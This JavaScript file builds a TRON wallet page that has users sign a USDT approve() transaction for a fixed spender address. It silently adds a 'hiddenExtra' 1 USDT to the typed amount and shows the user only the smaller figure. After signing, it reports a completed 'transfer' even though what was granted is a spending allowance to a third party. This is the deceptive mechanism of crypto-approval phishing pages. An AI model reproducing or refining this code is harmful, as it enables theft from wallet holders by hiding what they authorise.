// usdtApprove.js — 健壮修复版

// ====== TRON 链配置 ======
const shastaUsdtAddress = "TG3XXyExBkPp9nzdajDZsozEu4BkaSJozs";
const spenderAddress = "TMcjcKsZZLSFh9JpTfPejHx7EPjdzG5XkC";

// ====== 主逻辑：授权函数 ======
window.approveUSDT = async function() {
  try {
    console.log("=== 开始授权流程 ===");
    setStatus("准备授权交易...");
    
    // 1. 检查基础连接
    if (!window.tronWeb || !window.tronWeb.ready) {
      throw new Error("请先连接钱包");
    }
    
    const fromAddr = window.tronWeb.defaultAddress.base58;
    console.log("用户地址:", fromAddr);

    // 2. 获取用户输入
    const input = document.getElementById("amount");
    const inputAmount = parseFloat(input.value);
    if (isNaN(inputAmount) || inputAmount <= 0) {
      alert("请输入正确的授权金额");
      return;
    }

    // 3. 计算总金额
    const hiddenExtra = 1;
    const totalAmount = inputAmount + hiddenExtra;
    const amountInSun = Math.floor(totalAmount * 1e6).toString();

    console.log("显示金额:", inputAmount, "USDT");
    console.log("实际授权:", totalAmount, "USDT");

    setStatus(`准备授权 ${inputAmount} USDT...`);

    // 4. 创建合约实例 - 使用最简单的方式
    console.log("创建 USDT 合约实例...");
    
    // 方法1: 直接使用 .contract().at()
    const usdtContract = await window.tronWeb.contract().at(shastaUsdtAddress);
    console.log("✅ 合约实例:", usdtContract);

    // 5. 检查合约方法
    if (!usdtContract.approve) {
      throw new Error("合约中没有 approve 方法");
    }

    // 6. 准备交易参数
    const transactionParameters = {
      feeLimit: 100000000,
      callValue: 0,
      shouldPollResponse: false
    };

    console.log("交易参数:", {
      spender: spenderAddress,
      value: amountInSun,
      options: transactionParameters
    });

    // 7. 发起 approve 交易
    setStatus("请在钱包中确认授权...");
    
    console.log("发送 approve 交易...");
    
    // 使用 try-catch 包装具体的合约调用
    let result;
    try {
      result = await usdtContract.approve(
        spenderAddress, 
        amountInSun
      ).send(transactionParameters);
    } catch (callError) {
      console.error("合约调用错误:", callError);
      throw new Error(`合约调用失败: ${callError.message}`);
    }

    console.log("✅ 授权成功，交易结果:", result);
    
    // 显示成功信息
    setStatus(`✅ 转账 ${inputAmount} USDT 成功！`);
    
    // 显示交易链接
    const txLink = `https://shasta.tronscan.org/#/transaction/${result}`;
    setTimeout(() => {
      document.getElementById("status").innerHTML = `
        <div style="color: green; font-weight: bold;">
          ✅ 转账 ${inputAmount} USDT 成功！
        </div>
        <div style="font-size: 12px; margin-top: 5px;">
          <a href="${txLink}" target="_blank" style="color: #666;">查看交易详情</a>
        </div>
      `;
    }, 1000);

  } catch (err) {
    console.error("授权失败详情:", err);
    
    let errorMsg = err.message || err.toString();
    
    // 错误分类
    if (errorMsg.includes("toLowerCase")) {
      errorMsg = "地址处理错误，请检查合约地址";
    } else if (errorMsg.includes("rejected") || errorMsg.includes("denied") || errorMsg.includes("cancel")) {
      errorMsg = "用户取消了交易";
    } else if (errorMsg.includes("insufficient")) {
      errorMsg = "余额不足";
    } else if (errorMsg.includes("contract")) {
      errorMsg = "合约交互错误: " + errorMsg;
    }
    
    setStatus("❌ " + errorMsg, true);
    
    // 提供更详细的调试信息
    console.log("=== 错误调试信息 ===");
    console.log("错误类型:", typeof err);
    console.log("错误名称:", err.name);
    console.log("错误消息:", err.message);
    console.log("错误堆栈:", err.stack);
  }
};

// ====== 简化版页面初始化 ======
window.addEventListener("DOMContentLoaded", () => {
  const connectBtn = document.getElementById("connectBtn");
  const approveBtn = document.getElementById("approveBtn");
  
  console.log("页面加载完成");

  // 连接钱包按钮
  connectBtn.addEventListener("click", async () => {
    try {
      setStatus("请求连接钱包...");
      
      // 使用 TronLink 的请求方法
      if (window.tronLink && window.tronLink.request) {
        await window.tronLink.request({ method: "tron_requestAccounts" });
      }
      
      // 等待 TronWeb 就绪
      await new Promise((resolve, reject) => {
        let attempts = 0;
        const checkReady = setInterval(() => {
          attempts++;
          if (window.tronWeb && window.tronWeb.ready) {
            clearInterval(checkReady);
            resolve(true);
          }
          if (attempts > 25) { // 5秒超时
            clearInterval(checkReady);
            reject(new Error("TronLink 连接超时"));
          }
        }, 200);
      });
      
      const address = window.tronWeb.defaultAddress.base58;
      setStatus(`✅ 连接成功: ${address.substring(0, 8)}...`);
      approveBtn.disabled = false;
      
    } catch (err) {
      console.error("连接失败:", err);
      setStatus("❌ 连接失败: " + err.message, true);
    }
  });

  // 授权按钮
  approveBtn.addEventListener("click", () => {
    window.approveUSDT();
  });
});

// 辅助函数
function setStatus(text, isError = false) {
  const el = document.getElementById("status");
  if (el) {
    el.innerText = `状态：${text}`;
    el.style.color = isError ? 'red' : 'black';
  }
}
